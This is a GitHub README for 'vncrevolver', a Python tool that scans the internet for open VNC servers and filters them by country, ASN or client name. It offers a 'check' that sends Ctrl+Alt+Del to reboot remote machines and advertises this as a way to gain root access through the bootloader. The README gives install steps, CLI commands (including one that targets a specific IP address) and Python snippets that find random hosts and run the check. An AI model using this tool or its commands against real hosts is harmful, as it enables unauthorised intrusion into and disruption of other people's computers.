# VNCREVOLVER
## Automate search for open VNC servers
![vnc](https://github.com/cristiancmoises/vncrevolver/assets/86272521/18f2c15d-2232-47f4-b713-093af67daa7a)

# Table Of Contents

* [`Dependencies`](#required)
* [`Install`](#install)
* [`Features`](#features)
* [`Usage`](#commands)


## Required:
     pip install pydantic 
     pip install asyncvnc 
     pip install aiohttp

# Install:
    git clone https://github.com/cristiancmoises/vncrevolver
    cd vncrevolver
# Features
|    Some Features                                                                   |
|------------------------------------------------------------------------------------|
| 🌎  _Search for many open Vnc Servers around the world_                             |
| 📍 _Filter by country_                                                             |
| 🔢   _List more than one_                                                            |
| 🖥️  _List by Client name_                                                            |
| ✅  _Checks them for vulnerabilities by rebooting the machine via Ctrl+ALT+DEL, obtaining root access through the operating system bootloader easyly._ |

# Commands
## BASIC:
    python -m vncrevolver
    
## DEEP SEARCH:
    python -m vncrevolver --clientname ubuntu --count 10

## CTRL + ALT + DEL  | CHECK
    python -m vncrevolver --clientname ubuntu --count 10 --check_crt_alt_del

## CHECK A SPECIFIC ADDRESS:
    python -m vncrevolver --check_crt_alt_del 123.12.1.23:5901

> # START ME UP!   
    $ python -m vncrevolver --help

    usage: vncrevolver [-h] [--clientname CLIENTNAME] [--country COUNTRY] [--asn ASN]  [--count COUNT] [--check_crt_alt_del [CHECK_CRT_ALT_DEL]] [--show_failed] [--screen_delay SCREEN_DELAY]

    optional arguments:
    -h, --help            show this help message and exit
    --clientname CLIENTNAME
                        Filter by client name, note that it is case-sensitive!
    --country COUNTRY     Filter by ISO 3166-1 alpha-2 country code
    --asn ASN             Filter by ASN
    --count COUNT         Number of VNCs to find
    --check_crt_alt_del [CHECK_CRT_ALT_DEL]
                        If you specify this parameter without a value, only those VNCs from the search that pass the ctrl_alt_del check will be returned. If a value is passed, it must be a VNC
                        address that will be checked against ctrl_alt_del.
    --show_failed         Return VNCs that failed the ctrl_alt_del check
    --screen_delay SCREEN_DELAY
                        Delay between taking two screenshots in milliseconds


> # Use filters:

    from typing import List
    from vncrevolver.search import VNC, search_filter

    hosts: List[VNC] = await search_filter(clientname='ubuntu')
    for vnc in hosts:
    print(vnc.ip, vnc,port)

> # Random Search
    from vncrevolver.search import VNC, search_random
    vnc: VNC = await search_random()
    print(vnc.ip, vnc.port)
  
> # Ctrl + ALT + DEL - CHECK UP!
    from vncrevolver.search import VNC, search_random
    from vncrevolver.vnc import check_crt_alt_del
    vnc: VNC = await search_random()
    print(await check_crt_alt_del(vnc.ip, vnc.port))

   
